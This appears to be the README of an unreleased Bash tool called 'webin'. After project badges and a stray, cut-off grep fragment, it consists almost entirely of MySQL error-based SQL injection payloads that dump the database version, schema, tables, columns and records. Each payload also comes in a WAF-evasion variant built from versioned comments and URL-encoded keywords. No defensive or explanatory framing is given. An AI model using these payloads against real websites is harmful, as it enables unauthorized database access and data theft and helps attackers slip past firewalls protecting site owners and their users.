# webin ( not release yet )

<p align="center">
<img src="https://img.shields.io/badge/Version-1.0-purple?style=for-the-badge">
<img src="https://img.shields.io/github/license/1337r0j4n/webin?style=for-the-badge">
<img src="https://img.shields.io/github/stars/1337r0j4n/webin?style=for-the-badge">
<img src="https://img.shields.io/github/forks/1337r0j4n/webin?color=orange&style=for-the-badge">
<img src="https://img.shields.io/github/issues/1337r0j4n/webin?color=pink&style=for-the-badge">
</p>

<p align="center">
<img src="https://img.shields.io/badge/Open%20Source-Yes-darkcyan?style=for-the-badge">
<img src="https://img.shields.io/badge/Written%20In-Bash-darkblue?style=for-the-badge">
<img src="https://img.shields.io/badge/author%20-1337r0j4n-brown?style=for-the-badge">
<img src="https://api.visitorbadge.io/api/visitors?path=https%3A%2F%2Fgithub.com%2F1337r0j4n%2Fwebin&countColor=%23263759">
</p>


| grep -oP '(?<=[&?])[^&]*'
```
dump_version="+OR+1+GROUP+BY+CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2))+HAVING+MIN(0)+OR+1--+-"
dump_version_waf="+/*!50000%4fR/**x**/*/+1+/*!50000%47ROUP/**x**/*/+/*!50000%42Y/**x**/*/+/*!50000%43ONCAT_WS/**x**/*/(0x3a,/*!50000%76ersion/**x**/*/(),/*!50000%46LOOR/**x**/*/(/*!50000%52AND/**x**/*/(0)*2))+/*!50000%48AVING/**x**/*/+MIN(0)+/*!50000%4fR/**x**/*/+1--+-"
```
```
dump_database="+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(DATABASE()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+-"
dump_database_waf="+/*!50000%41ND/**x**/*/(/*!50000%53ELECT/**x**/*/+1+/*!50000%46ROM/**x**/*/+(/*!50000%53ELECT/**x**/*/+%43OUNT(*),/*!50000%43ONCAT/**x**/*/((/*!50000%53ELECT/**x**/*/(/*!50000%53ELECT/**x**/*/+/*!50000%43ONCAT/**x**/*/(%43AST(/*!50000%44ATABASE/**x**/*/()+/*!50000%41S/**x**/*/+/*!50000%43HAR/**x**/*/),0x7e))+/*!50000%46ROM/**x**/*/+/*!50000%49NFORMATION_%53CHEMA/**x**/*/./*!50000%54ABLES/**x**/*/+/*!50000%57HERE/**x**/*/+/*!50000%74able_%73chema/**x**/*/=/*!50000%44ATABASE/**x**/*/()+/*!50000%4cIMIT/**x**/*/+0,1),/*!50000%46LOOR/**x**/*/(/*!50000%52AND*/(0)*2))x+/*!50000%46ROM/**x**/*/+/*!50000%49NFORMATION_%53CHEMA/**x**/*/./*!50000%54ABLES/**x**/*/+/*!50000%47ROUP/**x**/*/+/*!50000%42Y/**x**/*/+x)a)--+-"
```
```
dump_table="+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=0x61646d696e+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+-"
dump_table_waf="+/*!50000%41ND/**x**/*/(/*!50000%53ELECT/**x**/*/+1+/*!50000%46ROM/**x**/*/+(/*!50000%53ELECT/**x**/*/+%43OUNT(*),/*!50000%43ONCAT/**x**/*/((/*!50000%53ELECT/**x**/*/(/*!50000%53ELECT/**x**/*/+/*!50000%43ONCAT/**x**/*/(%43AST(/*!50000%74able_%6eame/**x**/*/+/*!50000%41S/**x**/*/+/*!50000%43HAR/**x**/*/),0x7e))+/*!50000%46ROM/**x**/*/+/*!50000%49NFORMATION_%53CHEMA/**x**/*/./*!50000%54ABLES/**x**/*/+/*!50000%57HERE/**x**/*/+/*!50000%74able_%73chema/**x**/*/=0x7365637572697479+/*!50000%4cIMIT/**x**/*/+0,1),/*!50000%46LOOR/**x**/*/(/*!50000%52AND/**x**/*/(0)*2))x+/*!50000%46ROM/**x**/*/+/*!50000%49NFORMATION_%53CHEMA/**x**/*/./*!50000%54ABLES/**x**/*/+/*!50000%47ROUP/**x**/*/+/*!50000%42Y/**x**/*/+x)a)--+-"
```
```
dump_column="+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(column_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name=0x61646d696e+AND+table_schema=0x61646d696e+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+-"
dump_column_waf="+/*!50000%41ND/**x**/*/+(/*!50000%53ELECT/**x**/*/+1+/*!50000%46ROM/**x**/*/+(/*!50000%53ELECT/**x**/*/+%43OUNT(*),/*!50000%43ONCAT/**x**/*/((/*!50000%53ELECT/**x**/*/(/*!50000%53ELECT/**x**/*/+/*!50000%43ONCAT/**x**/*/(%43AST(/*!50000%63olumn_%6eame/**x**/*/+/*!50000%41S/**x**/*/+/*!50000%43HAR/**x**/*/),0x7e))+/*!50000FROM/**x**/*/+/*!50000INFORMATION_SCHEMA/**x**/*/./*!50000%43OLUMNS/**x**/*/+/*!50000%57HERE/**x**/*/+/*!50000%74able_%6eame/**x**/*/=0x7573657273+/*!50000%41ND/**x**/*/+/*!50000%74able_%73chema/**x**/*/=0x7365637572697479+/*!50000%4cIMIT/**x**/*/+0,1),/*!50000%46LOOR/**x**/*/(/*!50000%52AND/**x**/*/(0)*2))x+/*!50000%46ROM/**x**/*/+/*!50000%49NFORMATION_%53CHEMA/**x**/*/./*!50000%54ABLES/**x**/*/+/*!50000%47ROUP/**x**/*/+/*!50000%42Y/**x**/*/+x)a)--+-"
```
```
dump_data="+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(admin)+AS+CHAR),0x7e))+FROM+admin.admin+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+-"
dump_data_waf="+/*!50000%41ND/**x**/*/+(/*!50000%53ELECT/**x**/*/+1+FROM+(/*!50000%53ELECT/**x**/*/+%43OUNT(*),/*!50000%43ONCAT/**x**/*/((/*!50000%53ELECT/**x**/*/(/*!50000%53ELECT/**x**/*/+/*!50000%43ONCAT/**x**/*/(%43AST(/*!50000%43ONCAT/**x**/*/(column,0x3a3a,column)+/*!50000%41S/**x**/*/+/*!50000%43HAR/**x**/*/),0x7e))+/*!50000%46ROM/**x**/*/+database.table+/*!50000%4cIMIT/**x**/*/+3,1),/*!50000%46LOOR/**x**/*/(/*!50000%52AND/**x**/*/(0)*2))x+/*!50000%46ROM/**x**/*/+/*!50000%49NFORMATION_%53CHEMA/**x**/*/./*!50000%54ABLES/**x**/*/+/*!50000%47ROUP/**x**/*/+/*!50000%42Y/**x**/*/+x)a)--+-"
```
